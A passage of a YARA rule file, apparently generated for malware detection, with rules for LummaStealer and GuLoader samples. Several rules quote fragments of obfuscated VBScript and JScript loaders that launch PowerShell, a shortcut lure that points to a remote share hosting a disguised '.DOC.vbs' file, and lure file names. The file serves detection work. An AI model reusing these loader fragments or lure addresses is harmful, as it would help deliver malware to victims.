      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "* eFr,<" fullword ascii /* score: '9.00'*/
      $s3 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s4 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s5 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__08a07d9be19d1f329c4ea80bf355ee64_imphash__cc8a223b {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_08a07d9be19d1f329c4ea80bf355ee64(imphash)_cc8a223b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cc8a223b9967a9ffada7bfbfee927c0089f7c07d5829029cdc36d61478e53f07"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s3 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s4 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule GuLoader_signature__1c03065a {
   meta:
      description = "_subset_batch - file GuLoader(signature)_1c03065a.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1c03065a80c0715115669f1bad64e2486b464b294ea957f4d83c3e0b418722e9"
   strings:
      $x1 = "var Daadrigtun = Konge202.Exec(\"cmd /c where powers\" + greysarbe + \"ell\");" fullword ascii /* score: '37.00'*/
      $x2 = "Curt.ShellExecute(\"explorer.exe\",Ankechefe + \"\\system32\\MRT.exe\",\"\",\"open\",0);" fullword ascii /* score: '37.00'*/
      $x3 = "var Daadrigtun = Konge202.Exec(\"cmd /c echo h\");" fullword ascii /* score: '33.00'*/
      $s4 = "Stemmeu.Item(0).Document.Application.ShellExecute(greysarbe,String.fromCharCode(34)+Yderli+String.fromCharCode(34),\"\",\"open\"" ascii /* score: '21.00'*/
      $s5 = "Yderli = \"$filmstje=$env:appdata+'\\\\Waster';$Headlongwi=(Get-Item $filmstje).OpenText().ReadToEnd();$befng=$Headlongwi[4236.." ascii /* score: '18.00'*/
      $s6 = "var klaneren = Konge202.ExpandEnvironmentStrings(\"%APPDATA%\")+'\\\\Waster';" fullword ascii /* score: '18.00'*/
      $s7 = "behnd = behnd + \"  bEbbbSb bTbb - b pbbbA bbt .bh ,b  bb$bb.Bbbba bbRbbbObbbKbbb2bbb3bb 1,bb)');whilSrinks (!$wald) {CountSrink" ascii /* score: '17.00'*/
      $s8 = "Yderli = \"$filmstje=$env:appdata+'\\\\Waster';$Headlongwi=(Get-Item $filmstje).OpenText().ReadToEnd();$befng=$Headlongwi[4236.." ascii /* score: '14.00'*/
      $s9 = "8] -join '';.$befng $Headlongwi\"" fullword ascii /* score: '13.00'*/
      $s10 = "var Contemporarilydutch;" fullword ascii /* score: '13.00'*/
      $s11 = "Indrykningsposit = Indrykningsposit - 3376437;" fullword ascii /* score: '12.00'*/
      $s12 = "Konge202 = new ActiveXObject(\"WScript.Shell\");" fullword ascii /* score: '12.00'*/
      $s13 = "//Sessioner jenlaagets! hodges fueler." fullword ascii /* score: '12.00'*/
      $s14 = "behnd = behnd + \"  bEbbbSb bTbb - b pbbbA bbt .bh ,b  bb$bb.Bbbba bbRbbbObbbKbbb2bbb3bb 1,bb)');whilSrinks (!$wald) {CountSrink" ascii /* score: '12.00'*/
      $s15 = "greysarbe = greysarbe.substring(greysarbe.length - 14);" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule GuLoader_signature_ {
   meta:
      description = "_subset_batch - file GuLoader(signature).url"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dfc7723f23ceeb2f5bd0e76cdfdc379d14302e32c04fa1fc21c0218ca08ced1b"
   strings:
      $s1 = "IconFile=C:\\Program Files\\Microsoft Office\\root\\Office16\\WORDICON.EXE" fullword ascii /* score: '24.00'*/
      $s2 = "URL=file:///\\\\109.71.252.234\\Downloads\\IMG_08242025-PRICELIST.DOC.vbs" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x495b and filesize < 1KB and
      all of them
}

rule GuLoader_signature__2 {
   meta:
      description = "_subset_batch - file GuLoader(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1c5320ec3fe68103bf0ae925bf10b5da64f010d777f67398b21d88bc78968dba"
   strings:
      $s1 = "Execute \"Chilipepper173.\" + miltens + \"Exe\" & chr(99) & \"ute Tumbledown,stylistics,Unden,Forkulningernes ,Modekommandoen\"" fullword ascii /* score: '22.00'*/
      $s2 = "'Eyeline. arbejdsprocesserne underfiend" fullword ascii /* score: '20.00'*/
      $s3 = "Notepaper = Notepaper + \"W].WWW:\"" fullword ascii /* score: '17.00'*/
      $s4 = "'Undecide overhostility? dagtemperaturernes: springed. bebopper" fullword ascii /* score: '16.00'*/
      $s5 = "Set Handelsmonopols = GetObject(\"win\" + \"mgmts://./root/default:StdRegProv\")" fullword ascii /* score: '16.00'*/
      $s6 = "'Oksetungerne circumterrestrial! grundskabelons complutensian" fullword ascii /* score: '15.00'*/
      $s7 = "Notepaper = Notepaper + \"%%%i%%%%l\"" fullword ascii /* score: '15.00'*/
      $s8 = "'Brodfrenes; kemigrafi fourflushers nvnsprocesser" fullword ascii /* score: '15.00'*/
      $s9 = "Notepaper = Notepaper + \"%%d %%%f%\"" fullword ascii /* score: '15.00'*/
      $s10 = "Notepaper = Notepaper + \"papppplpp.p:\"" fullword ascii /* score: '14.00'*/
      $s11 = "Notepaper = Notepaper + \"::,:t:\"" fullword ascii /* score: '14.00'*/
      $s12 = "'Counterexpostulation fadllenes: spiritusbestemmelsers. unlurking! udgiftsbyrdens," fullword ascii /* score: '14.00'*/
      $s13 = "'Noncircumspectly; minerologists juste? uvilkaarligheden unbanked" fullword ascii /* score: '14.00'*/
      $s14 = "'Assistentuddannelsens45 totalleverandrers? apologetiske preretirement. udpantningen:" fullword ascii /* score: '14.00'*/
      $s15 = "Private Const Anthropologic = 8535" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 400KB and
      8 of them
}

rule GuLoader_signature__0f39a156 {
   meta:
      description = "_subset_batch - file GuLoader(signature)_0f39a156.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0f39a156638df14e9dc70d0ba37b12d091b9a47d33d10b93a764a4525053ff0d"
   strings:
      $s1 = "08180808180 1  ,F8i r8e8f odocx / 184 1 doc 0';$postgangen=pdfhiftage ',U[pdf[E[R -[a[g[e[n[T';$templises=pdfhiftage ' h tpt pps" ascii /* score: '20.00'*/
      $s2 = "Set Purloins = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2\")" fullword ascii /* score: '19.00'*/
      $s3 = "Call Forhandlingspartners93.ShellExecute(Frihedskmpernes & Unhonorables, Mussing, \"\", \"\", Unarticulated)" fullword ascii /* score: '18.00'*/
      $s4 = "Motocrossbane = Motocrossbane + \"i1t1(1$1A F1s1P1O,r1)');Appreteres (pdfhiftage $gaskammerets);$templises=$autoclaved[0];$bet#0" ascii /* score: '16.50'*/
      $s5 = "'Sektionerede89! betryggelserne boomeranging foreningsprocesser167 slakable" fullword ascii /* score: '15.00'*/
      $s6 = "Motocrossbane = Motocrossbane + \"i1t1(1$1A F1s1P1O,r1)');Appreteres (pdfhiftage $gaskammerets);$templises=$autoclaved[0];$bet#0" ascii /* score: '15.00'*/
      $s7 = "'Konkurserne substitutionsrettighedernes heredity. kommunikationsprocessens" fullword ascii /* score: '15.00'*/
      $s8 = "Motocrossbane = Motocrossbane + \"Get-DiskpdfNV;function pdfhiftage ($blkpatron){ $fejeskarn=1;do {$rinkningerne229+=$blkpatron[" ascii /* score: '15.00'*/
      $s9 = "'Produktionsprocessernes. ficusen! bastardmrtel83:" fullword ascii /* score: '15.00'*/
      $s10 = "o%B%a%l :%V I LdocD,F%r%E%D%pdf%=%$%Gdocl o B A%l : s%T a%n,G l A K R,i%D%pdf e n%+ + %,$ A%UdocT%O%c l a,V e%D%doc%C o%u%N t') " ascii /* score: '14.50'*/
      $s11 = "'Postulates: minigrants? vinetta" fullword ascii /* score: '14.00'*/
      $s12 = "'Apologetens unfoolable? lunges172," fullword ascii /* score: '14.00'*/
      $s13 = "Motocrossbane = Motocrossbane + \"Get-DiskpdfNV;function pdfhiftage ($blkpatron){ $fejeskarn=1;do {$rinkningerne229+=$blkpatron[" ascii /* score: '13.00'*/
      $s14 = "'Decomposer selvmord isopyrrole! jerreed descriptions," fullword ascii /* score: '13.00'*/
      $s15 = "'Toadroot; disharmoniske circensian" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x7546 and filesize < 200KB and
      8 of them
}

rule GuLoader_signature__3 {
   meta:
      description = "_subset_batch - file GuLoader(signature).xz"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bdd4e38a34424df25056abc01d4d22e7ae82716ba78e14dd132c6892e1527e85"
   strings:
      $s1 = "LPayment_Advice-008202025-09144990924628812077399012127854512000565294392.exe" fullword ascii /* score: '19.00'*/
      $s2 = "customer_referenceportal.scr" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule LummaStealer_signature__4c8d813e0525dbcd2bdd821271a3af3e_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_4c8d813e0525dbcd2bdd821271a3af3e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c50d92515df291fcd4636a489698c4117c89098cfa5195ecdc7ebdfbebd01901"
   strings:
      $s1 = "7$=*=>=D=" fullword ascii /* score: '9.00'*/ /* hex encoded string '}' */
      $s2 = "000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F202122232425262728292A2B2C2D2E2F303132333435363738393A3B3C3D3E3F" ascii /* score: '8.00'*/
      $s3 = "404142434445464748494A4B4C4D4E4F505152535455565758595A5B5C5D5E5F606162636465666768696A6B6C6D6E6F707172737475767778797A7B7C7D7E7F" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__28935c2d {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_28935c2d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "28935c2d473fd73a307b70be48b5be81f5a25a9c636841e5e60b981f26ded3cd"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.85.8-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s4 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__0b9f8407 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_0b9f8407.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0b9f8407a40968b62cfb3679c746f7e8e18d37acf03e842e016c7fbc2506dc23"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v3.28.6-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "\\3{\"\\0" fullword ascii /* score: '10.00'*/ /* hex encoded string '0' */
      $s4 = "* ;xg~NR?" fullword ascii /* score: '9.00'*/
      $s5 = "555:==;C--*/" fullword ascii /* score: '9.00'*/ /* hex encoded string 'U\' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__56a78d55f3f7af51443e58e0ce2fb5f6_imphash__e5e0b7c6 {
   meta:
      description = "_subset_batch - file GuLoader(signature)_56a78d55f3f7af51443e58e0ce2fb5f6(imphash)_e5e0b7c6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e5e0b7c67de28ab309fe8703597865da523252d8588da14b88117a5ff83707e6"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.08</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__56a78d55f3f7af51443e58e0ce2fb5f6_imphash__f5bf6b82 {
   meta:
      description = "_subset_batch - file GuLoader(signature)_56a78d55f3f7af51443e58e0ce2fb5f6(imphash)_f5bf6b82.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f5bf6b82bfa0939c61324692962f9c911ad26f85b99498d705e5ad690b45280b"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.08</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__4ea4df5d94204fc550be1874e1b77ea7_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_4ea4df5d94204fc550be1874e1b77ea7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b7053441ee84042febef9d5c04316bd1d16c30c14b19cd9f329eeca973496107"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.01</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "#* ^WA" fullword ascii /* score: '9.00'*/
      $s4 = "N#* S*1'X29/^?D:gQVKvgj`" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__7192d3773f389d45ebac3cc67d054a8a_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_7192d3773f389d45ebac3cc67d054a8a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3cdaaf833eb203d3d91b3cd5a83351d0a278ce559c2628ce959e2754bac31ec9"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "ontrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssemb" ascii /* score: '25.00'*/
      $s3 = "ndency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asI" ascii /* score: '22.00'*/
      $s4 = "hetaery.exe" fullword wide /* score: '22.00'*/
      $s5 = "nstall System v3.0b3</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Commo" ascii /* score: '13.00'*/
      $s6 = "ker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatib" ascii /* score: '10.00'*/
      $s7 = "8N%u:\"" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__e2a592076b17ef8bfb48b7e03965a3fc_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_e2a592076b17ef8bfb48b7e03965a3fc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4783dc2b6743dccb3b7498bd99df0c9aa75e7b12c93abd539dfd9da0673702ef"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.01</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "photonic" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__e2a592076b17ef8bfb48b7e03965a3fc_imphash__88486485 {
   meta:
      description = "_subset_batch - file GuLoader(signature)_e2a592076b17ef8bfb48b7e03965a3fc(imphash)_88486485.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "884864855633b98e58e07d92d82cb892d2669dffe54860bdefad335b0532bd94"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.01</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "photonic" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__573bb7b41bc641bd95c0f5eec13c233b_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_573bb7b41bc641bd95c0f5eec13c233b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0e3f546626ce86d28ca34a23b098c2ccdca46e4e676d3459b8c829c23bf4d834"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.11</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "~nsu%X.tmp" fullword wide /* score: '11.00'*/
      $s4 = "HfZv.qpR^" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__b34f154ec913d2d2c435cbd644e91687_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_b34f154ec913d2d2c435cbd644e91687(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0beef64ae4511b59c647c138f0ea75df9d380997bdb42586cdd3f5db748402ef"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s3 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s4 = "nstall System v3.02.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s5 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__56a78d55f3f7af51443e58e0ce2fb5f6_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_56a78d55f3f7af51443e58e0ce2fb5f6(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c86a9e96f6dc66ebcc40b7d400a8d72edd6ad00baf7e0b3e5bbe033b28384512"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.08</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "EJtHL<K- =" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__7eae418c7423834ffc3d79b4300bd6fb_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_7eae418c7423834ffc3d79b4300bd6fb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "20a9746928eddcb90bfdc958be70fca50b6b6e54a8caf16fac8de3a24566f4b0"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.05</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__b34f154ec913d2d2c435cbd644e91687_imphash__3ddd82bc {
   meta:
      description = "_subset_batch - file GuLoader(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_3ddd82bc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3ddd82bce703cb86f5c8301c42cd5b4bb2b0f4240d218ad99877b50ba6245da0"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "diminishment.exe" fullword wide /* score: '22.00'*/
      $s3 = "nstall System v3.02</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "e$$$J--->6666CCC.SSS&ZZZ#@@@/333aMMN" fullword ascii /* score: '9.00'*/
      $s5 = "lllraaa" fullword ascii /* score: '8.00'*/
      $s6 = "dddzvvvbkkkf" fullword ascii /* score: '8.00'*/
      $s7 = "nnnraaa" fullword ascii /* score: '8.00'*/
      $s8 = "hhhrddd" fullword ascii /* score: '8.00'*/
      $s9 = "gggzxxxd" fullword ascii /* score: '8.00'*/
      $s10 = "fffsddd" fullword ascii /* score: '8.00'*/
      $s11 = "jjjrbbb" fullword ascii /* score: '8.00'*/
      $s12 = "eeezwwwcxxxd" fullword ascii /* score: '8.00'*/
      $s13 = "dddsfff" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule GuLoader_signature__b34f154ec913d2d2c435cbd644e91687_imphash__481edbec {
   meta:
      description = "_subset_batch - file GuLoader(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_481edbec.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "481edbecf86288576f76cba07a45dca0367c1b5410f7dfc56227788b5affa9ca"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "douce wheerikins.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.04</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "aaadddeeee" ascii /* score: '8.00'*/
      $s5 = "CgWdN* i" fullword ascii /* score: '8.00'*/
      $s6 = "sildebensmnstres" fullword wide /* score: '8.00'*/
      $s7 = "frekvensgangen" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__b34f154ec913d2d2c435cbd644e91687_imphash__7ed83206 {
   meta:
      description = "_subset_batch - file GuLoader(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_7ed83206.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7ed8320624ad388956a315ab33bac4e4ae90c575430c9bf8118c2687d4723f28"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "douce wheerikins.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.04</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "aaadddeeee" ascii /* score: '8.00'*/
      $s5 = "sildebensmnstres" fullword wide /* score: '8.00'*/
      $s6 = "frekvensgangen" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__b34f154ec913d2d2c435cbd644e91687_imphash__ae47b703 {
   meta:
      description = "_subset_batch - file GuLoader(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_ae47b703.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae47b703f181818aab82d491b60a6329419d911030eebb61e3a007314f1a9257"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "douce wheerikins.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.04</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "aaadddeeee" ascii /* score: '8.00'*/
      $s5 = "sildebensmnstres" fullword wide /* score: '8.00'*/
      $s6 = "frekvensgangen" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__b34f154ec913d2d2c435cbd644e91687_imphash__b46275f6 {
   meta:
      description = "_subset_batch - file GuLoader(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_b46275f6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b46275f6adf6aaa106de792bfe4880529ec773efc3ca1627dc4799056c27cef5"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "douce wheerikins.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.04</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "aaadddeeee" ascii /* score: '8.00'*/
      $s5 = "sildebensmnstres" fullword wide /* score: '8.00'*/
      $s6 = "frekvensgangen" fullword wide /* score: '8.00'*/
      $s7 = "Portal1" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__61259b55b8912888e90f516ca08dc514_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_61259b55b8912888e90f516ca08dc514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2e253d18db6303f5d34efff4aabfa4e5c72b550fd9dcb87013a6cc633401be9b"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "boletuses trskreri.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.08</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "lMBT.CfU" fullword ascii /* score: '10.00'*/
      $s5 = "cccrxxx" fullword ascii /* score: '8.00'*/
      $s6 = "zzzozzz" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

